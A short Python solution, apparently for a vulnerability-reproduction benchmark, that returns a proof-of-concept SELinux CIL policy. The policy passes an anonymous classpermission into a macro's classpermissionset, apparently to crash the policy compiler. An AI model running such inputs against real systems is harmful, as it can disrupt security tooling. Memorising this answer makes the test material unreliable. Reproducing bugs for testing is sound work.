from typing import Optional

class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = """
(macro m ((p classpermission))
    (classpermissionset s (p))
)
(call m ((p (file (read)))))
"""
        return poc.strip().encode()